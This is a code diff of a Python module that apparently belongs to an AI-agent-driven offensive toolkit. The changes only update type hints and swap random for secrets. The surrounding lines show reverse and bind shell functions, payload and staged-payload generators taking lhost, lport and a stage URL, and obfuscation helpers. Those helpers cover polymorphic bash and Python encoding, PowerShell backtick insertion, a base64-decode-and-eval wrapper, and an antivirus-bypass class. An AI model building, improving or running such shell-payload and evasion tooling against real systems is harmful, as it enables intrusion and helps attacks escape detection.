@@ -5,8 +5,9 @@
 
 import asyncio
 import base64
+import secrets
 import logging
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any
 
 # Setup logger
 logger = logging.getLogger(__name__)
@@ -30,7 +31,7 @@ class PayloadError(Exception):
     pass
 
 
-def check_payload_preconditions(state: "AgentState") -> Tuple[bool, str]:
+def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
     """
     Payload precondition check - STRICTLY REQUIRED.
 
@@ -69,7 +70,7 @@ def check_payload_preconditions(state: "AgentState") -> Tuple[bool, str]:
 # -------------------------
 async def reverse_shell(
     state: "AgentState", target_ip: str = "127.0.0.1", target_port: int = 4444
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """
     STATE-AWARE Reverse shell - FOOTHOLD REQUIRED.
 
@@ -164,7 +165,7 @@ async def reverse_shell(
 # -------------------------
 async def bind_shell(
     state: "AgentState", listen_ip: str = "0.0.0.0", listen_port: int = 5555
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """
     STATE-AWARE Bind shell - FOOTHOLD GEREKLİ
 
@@ -265,7 +266,7 @@ def execute_command(state: "AgentState"):
 # -------------------------
 # AI-Powered Payload Recommendation
 # -------------------------
-def ai_payload_advice(state: "AgentState") -> Dict[str, Any]:
+def ai_payload_advice(state: "AgentState") -> dict[str, Any]:
     """
     AI-powered payload recommendation.
 
@@ -419,10 +420,10 @@ PAYLOAD_TEMPLATES = {
 def generate_payload(
     state: "AgentState",
     payload_type: str,
-    lhost: Optional[str] = None,
+    lhost: str | None = None,
     lport: int = 4444,
     encode: bool = False,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """
     Generate various payload types.
 
@@ -494,7 +495,7 @@ def generate_payload(
     }
 
 
-def list_payloads(os_filter: Optional[str] = None) -> List[Dict[str, Any]]:
+def list_payloads(os_filter: str | None = None) -> list[dict[str, Any]]:
     """
     List available payload templates.
 
@@ -560,7 +561,7 @@ class PayloadObfuscator:
         return "".join(f"\\u{ord(c):04x}" for c in payload)
 
     @staticmethod
-    def xor_encode(payload: str, key: int = 0x41) -> Tuple[str, int]:
+    def xor_encode(payload: str, key: int = 0x41) -> tuple[str, int]:
         """
         XOR encode payload.
 
@@ -616,11 +617,11 @@ class PayloadObfuscator:
 
 def _polymorphic_encode_bash(payload: str) -> str:
     """Polymorphic encoding for bash"""
-    import random
     import string
 
     def random_var(length=5):
-        return "".join(random.choices(string.ascii_lowercase, k=length))
+        import secrets
+        return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))
 
     var_map = {}
     keywords = ["bash", "dev", "tcp", "sh"]
@@ -639,21 +640,21 @@ def _polymorphic_encode_bash(payload: str) -> str:
     junk_ops = [
         "true",
         ":",
-        f"{random_var()}={random.randint(1, 99)}",
+        f"{random_var()}={secrets.randbelow(99) + 1}",
         "if [ 1 -eq 1 ]; then :; fi",
     ]
 
-    final_code = repo + [random.choice(junk_ops), mutated]
+    final_code = repo + [secrets.choice(junk_ops), mutated]
     return "; ".join(final_code)
 
 
 def _polymorphic_encode_python(payload: str) -> str:
     """Polymorphic encoding for Python"""
-    import random
     import string
 
     def random_var(length=5):
-        return "".join(random.choices(string.ascii_lowercase, k=length))
+        import secrets
+        return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))
 
     imports = ["socket", "subprocess", "os"]
     import_block = []
@@ -671,7 +672,8 @@ def _polymorphic_encode_python(payload: str) -> str:
     def fragment_string(s):
         if len(s) < 5:
             return f"'{s}'"
-        cut = random.randint(1, len(s) - 1)
+        import secrets
+        cut = secrets.randbelow(len(s) - 1) + 1
         return f"'{s[:cut]}'+'{s[cut:]}'"
 
     wrapper = f"""
@@ -720,11 +722,11 @@ class PowerShellObfuscator:
     @staticmethod
     def tick_obfuscation(payload: str) -> str:
         """Insert backticks for obfuscation"""
-        import random
+        import secrets
 
         result = ""
         for char in payload:
-            if char.isalpha() and random.random() > 0.7:
+            if char.isalpha() and secrets.choice([True, False, False]):  # ~33%
                 result += "`" + char
             else:
                 result += char
@@ -749,9 +751,9 @@ class BashObfuscator:
     @staticmethod
     def variable_expansion(payload: str) -> str:
         """Use variable expansion tricks"""
-        import random
+        import secrets
 
-        var = "".join(chr(random.randint(97, 122)) for _ in range(4))
+        var = "".join(chr(secrets.randbelow(26) + 97) for _ in range(4))
         encoded = PayloadObfuscator.base64_encode(payload)
         return f'{var}={encoded}\neval "$(echo ${var} | base64 -d)"'
 
@@ -845,8 +847,8 @@ class AVBypass:
 
 
 def obfuscate_payload(
-    payload: str, language: str = "bash", techniques: Optional[List[str]] = None
-) -> Dict[str, Any]:
+    payload: str, language: str = "bash", techniques: list[str] | None = None
+) -> dict[str, Any]:
     """
     Apply obfuscation techniques to payload.
 
@@ -884,7 +886,7 @@ def obfuscate_payload(
 
 def _apply_obfuscation_technique(
     payload: str, technique: str, language: str
-) -> Tuple[str, Optional[str]]:
+) -> tuple[str, str | None]:
     """Apply a single obfuscation technique"""
     if technique == "base64":
         return _apply_base64_obfuscation(payload, language), "base64"
@@ -929,7 +931,7 @@ def _apply_concat_obfuscation(payload: str, language: str) -> str:
 
 def generate_staged_payload(
     state: "AgentState", payload_type: str, lhost: str, lport: int, stage_url: str
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """
     Generate staged payload with stager and stage.
 
